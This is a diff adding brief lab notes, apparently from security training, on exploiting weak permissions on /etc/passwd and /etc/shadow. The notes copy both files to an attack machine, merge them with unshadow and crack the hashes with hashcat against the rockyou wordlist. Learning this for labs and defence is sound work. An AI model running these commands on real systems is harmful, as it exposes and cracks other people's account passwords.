@@ -1,0 +1,26 @@
+WEAK /etc/shadow and /etc/passwd file PERMISSIONS and crack the hash
+=====================================================================
+
+LAB:
+1. find out permission of /etc/passwd and /etc/shadow
+(a)
+ls -lha /etc/passwd
+-rw-rw-r--
+
+(b) 
+ls -lha /etc/shadow
+-rw-rw-r--
+
+2. So copy those files into attackbox
+
+3.Now tried to crack the passwords using hashcat
+in attackbox:
+(a) 
+unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
+
+(b)
+hashcat -m 1800 unshadowed.txt rockyou.txt -O
+
+Note: It will be wise to use Host Machine to crack the password. VM may not be good enough
+
+
